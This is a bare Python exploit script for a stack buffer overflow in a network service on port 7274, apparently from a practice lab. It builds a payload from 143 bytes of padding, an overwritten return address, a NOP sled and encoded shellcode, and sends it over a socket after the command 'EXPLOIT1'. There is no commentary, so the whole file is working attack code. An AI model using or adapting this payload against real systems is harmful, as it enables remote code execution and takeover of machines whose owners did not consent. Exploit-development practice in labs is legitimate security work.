#!/usr/bin/python
# -*- coding: utf-8 -*-

#badchars= "\x00"

import sys, socket
from struct import *

host="192.168.0.53"
port=7274

offset = "A" * 143
eip = pack('<L', 0x7274146F)

buf =  b""
buf += b"\xbe\xc5\xba\x7e\xd0\xd9\xec\xd9\x74\x24\xf4\x5f"
buf += b"\x29\xc9\xb1\x52\x83\xc7\x04\x31\x77\x0e\x03\xb2"
buf += b"\xb4\x9c\x25\xc0\x21\xe2\xc6\x38\xb2\x83\x4f\xdd"
buf += b"\x83\x83\x34\x96\xb4\x33\x3e\xfa\x38\xbf\x12\xee"
buf += b"\xcb\xcd\xba\x01\x7b\x7b\x9d\x2c\x7c\xd0\xdd\x2f"
buf += b"\xfe\x2b\x32\x8f\x3f\xe4\x47\xce\x78\x19\xa5\x82"
buf += b"\xd1\x55\x18\x32\x55\x23\xa1\xb9\x25\xa5\xa1\x5e"
buf += b"\xfd\xc4\x80\xf1\x75\x9f\x02\xf0\x5a\xab\x0a\xea"
buf += b"\xbf\x96\xc5\x81\x74\x6c\xd4\x43\x45\x8d\x7b\xaa"
buf += b"\x69\x7c\x85\xeb\x4e\x9f\xf0\x05\xad\x22\x03\xd2"
buf += b"\xcf\xf8\x86\xc0\x68\x8a\x31\x2c\x88\x5f\xa7\xa7"
buf += b"\x86\x14\xa3\xef\x8a\xab\x60\x84\xb7\x20\x87\x4a"
buf += b"\x3e\x72\xac\x4e\x1a\x20\xcd\xd7\xc6\x87\xf2\x07"
buf += b"\xa9\x78\x57\x4c\x44\x6c\xea\x0f\x01\x41\xc7\xaf"
buf += b"\xd1\xcd\x50\xdc\xe3\x52\xcb\x4a\x48\x1a\xd5\x8d"
buf += b"\xaf\x31\xa1\x01\x4e\xba\xd2\x08\x95\xee\x82\x22"
buf += b"\x3c\x8f\x48\xb2\xc1\x5a\xde\xe2\x6d\x35\x9f\x52"
buf += b"\xce\xe5\x77\xb8\xc1\xda\x68\xc3\x0b\x73\x02\x3e"
buf += b"\xdc\xbc\x7b\x40\x2b\x55\x7e\x40\x43\x44\xf7\xa6"
buf += b"\x09\x96\x5e\x71\xa6\x0f\xfb\x09\x57\xcf\xd1\x74"
buf += b"\x57\x5b\xd6\x89\x16\xac\x93\x99\xcf\x5c\xee\xc3"
buf += b"\x46\x62\xc4\x6b\x04\xf1\x83\x6b\x43\xea\x1b\x3c"
buf += b"\x04\xdc\x55\xa8\xb8\x47\xcc\xce\x40\x11\x37\x4a"
buf += b"\x9f\xe2\xb6\x53\x52\x5e\x9d\x43\xaa\x5f\x99\x37"
buf += b"\x62\x36\x77\xe1\xc4\xe0\x39\x5b\x9f\x5f\x90\x0b"
buf += b"\x66\xac\x23\x4d\x67\xf9\xd5\xb1\xd6\x54\xa0\xce"
buf += b"\xd7\x30\x24\xb7\x05\xa1\xcb\x62\x8e\xd1\x81\x2e"
buf += b"\xa7\x79\x4c\xbb\xf5\xe7\x6f\x16\x39\x1e\xec\x92"
buf += b"\xc2\xe5\xec\xd7\xc7\xa2\xaa\x04\xba\xbb\x5e\x2a"
buf += b"\x69\xbb\x4a"


esp = "\x90" * 16
esp += buf

payload = offset + eip + esp

buffer = "EXPLOIT1 "
buffer += payload

exp = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
exp.connect((host,port))
print("Enviando exploit...")
exp.send(buffer)

exp.close()

